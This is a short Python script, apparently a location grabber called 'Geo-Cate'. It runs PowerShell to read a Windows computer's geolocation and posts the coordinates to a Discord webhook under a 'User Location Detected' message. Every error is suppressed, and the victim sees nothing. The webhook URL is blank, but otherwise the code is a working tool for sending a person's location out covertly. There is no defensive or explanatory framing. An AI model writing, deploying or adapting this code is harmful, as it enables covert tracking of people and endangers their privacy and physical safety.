import subprocess
import json
import requests
from datetime import datetime, timezone

WEBHOOK_URL = ""
CUSTOM_USERNAME = "Geo-Cate"  
CUSTOM_AVATAR_URL = "https://img.icons8.com/?size=512w&id=53430&format=png"  

def get_windows_location():
    try:
        powershell_script = """
        Add-Type -AssemblyName System.Device
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()
        Start-Sleep -Seconds 5
        if ($GeoWatcher.Position.Location.IsUnknown) {
            Write-Output "{}"
        } else {
            $Location = @{
                Latitude = $GeoWatcher.Position.Location.Latitude
                Longitude = $GeoWatcher.Position.Location.Longitude
                Timestamp = $GeoWatcher.Position.Timestamp
            }
            Write-Output ($Location | ConvertTo-Json -Depth 1)
        }
        """
        result = subprocess.run(
            ["powershell", "-Command", powershell_script],
            capture_output=True,
            text=True,
        )
        if result.returncode != 0:
            raise Exception(result.stderr.strip())
        location_data = json.loads(result.stdout.strip())
        if not location_data:
            raise Exception("Location is unknown.")
        location_data["Timestamp"] = convert_timestamp(location_data["Timestamp"])
        return location_data
    except Exception:
        return None

def convert_timestamp(timestamp):
    try:
        milliseconds = int(timestamp.strip("/Date()"))
        return datetime.fromtimestamp(milliseconds / 1000, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    except Exception:
        return "Invalid timestamp"

def send_to_discord(location):
    if not location:
        return
    payload = {
        "username": CUSTOM_USERNAME,
        "avatar_url": CUSTOM_AVATAR_URL,
        "content": "📍 **User Location Detected**",
        "embeds": [
            {
                "title": "Location Data",
                "color": 16711680,
                "fields": [
                    {"name": "Latitude", "value": str(location.get("Latitude", "N/A")), "inline": True},
                    {"name": "Longitude", "value": str(location.get("Longitude", "N/A")), "inline": True},
                    {"name": "Timestamp", "value": str(location.get("Timestamp", "N/A")), "inline": True},
                ],
            }
        ],
    }
    response = requests.post(WEBHOOK_URL, json=payload)
    if response.status_code != 204:
        pass

try:
    location = get_windows_location()
    send_to_discord(location)
except Exception:
    pass
